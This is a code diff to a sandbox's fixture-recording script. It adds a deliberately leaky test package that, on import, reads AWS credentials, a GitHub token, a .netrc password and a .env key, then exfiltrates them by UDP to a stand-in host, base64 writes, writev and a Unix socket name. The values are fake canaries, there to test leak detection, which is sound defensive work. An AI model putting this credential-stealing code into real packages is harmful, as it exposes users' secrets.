@@ -115,11 +115,50 @@ def record_baseline():
     save("events-baseline", result, steps, "sandbox_observe.run_harness: the empty-harness baseline (imports, no module)")
 
 
+# PR 11: one spec run whose import leaks four canaries in four ways (a UDP sendto, base64 in a write, a writev, an
+# abstract Unix socket name) and writes 70000 bytes (cut by strace -s 65536); and one clean spec run. The canaries
+# are the run's own random values; the .json keeps the spec with them so the tests can check the trace again.
+LEAK = r'''
+import base64, os, socket
+def attempt(f):
+    try: f()
+    except Exception as exc: print("attempt:", type(exc).__name__, exc)
+home = os.path.expanduser("~")
+aws = open(home + "/.aws/credentials").read()
+secret = [l.split("=", 1)[1].strip() for l in aws.splitlines() if l.startswith("aws_secret_access_key")][0]
+udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+attempt(lambda: udp.sendto(secret.encode(), ("198.51.100.24", 53)))
+os.write(1, b"t=" + base64.b64encode(os.environ["GITHUB_TOKEN"].encode()) + b"\n")
+password = open(home + "/.netrc").read().split()[-1]
+os.writev(1, [b"p=", password.encode(), b"\n"])
+api = open(home + "/.env").read().strip().split("=", 1)[1]
+attempt(lambda: socket.socket(socket.AF_UNIX).connect("\0" + api))
+os.write(1, b"B" * 70000 + b"\n")
+'''
+
+
+def record_spec(stem, name, code, what):
+    from backend.cavr import env_synthesis, sandbox_spec
+    quarantine = Path(tempfile.mkdtemp(prefix="cavr-record-"))
+    wheel = build_wheel(quarantine, name, "1.0", files={f"{name}/__init__.py": code})
+    node = {"name": name, "version": "1.0", "filename": wheel.name, "path": str(wheel),
+            "sha256": hashlib.sha256(wheel.read_bytes()).hexdigest()}
+    spec = env_synthesis.canary_spec()
+    result = sandbox_spec.run_spec([node], [name], spec, quarantine_dir=quarantine)
+    save(stem, result, result["evidence"]["job_steps"], f"sandbox_spec.run_spec: wheel {name} 1.0 {what}", [node])
+    meta = json.loads((HERE / f"{stem}.json").read_text())
+    meta["spec"] = spec
+    meta["note"] += "; the canaries are the run's own (fake, random) values"
+    (HERE / f"{stem}.json").write_text(json.dumps(meta, indent=2) + "\n", encoding="utf-8")
+
+
 RECORDINGS = {
     "events-probe": lambda: record_wheel("events-probe", "probe", PROBE, "whose import does PROBE"),
     "events-benign": lambda: record_wheel("events-benign", "benign", BENIGN, "(def run(): return 1)"),
     "events-baseline": record_baseline,
     "events-scoped": lambda: record_wheel("events-scoped", "demo", SCOPED, "whose import connects to 198.51.100.24:443"),
+    "spec-canary": lambda: record_spec("spec-canary", "leak", LEAK, "under canary_spec(), whose import leaks canaries"),
+    "spec-clean": lambda: record_spec("spec-clean", "benign", BENIGN, "under canary_spec() (def run(): return 1)"),
 }
 
 
